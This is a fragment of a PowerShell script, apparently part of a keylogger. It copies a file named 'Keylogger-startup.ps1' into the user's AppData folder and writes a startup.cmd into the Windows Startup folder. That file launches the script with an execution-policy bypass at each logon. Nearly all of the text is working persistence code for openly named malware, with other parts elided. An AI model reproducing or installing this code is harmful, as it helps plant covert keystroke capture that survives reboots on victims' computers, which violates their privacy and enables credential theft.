...
# Define the destination path in %APPDATA%
$appDataPath = Join-Path $env:APPDATA "Keylogger-startup.ps1"

# Move the script to %APPDATA%
...
# Create a startup.cmd file in the Startup folder
$startupFolderPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$startupCmdPath = Join-Path $startupFolderPath "startup.cmd"
$startupCmdContent = "powershell.exe -ExecutionPolicy Bypass -File `"$appDataPath`""
Set-Content -Path $startupCmdPath -Value $startupCmdContent
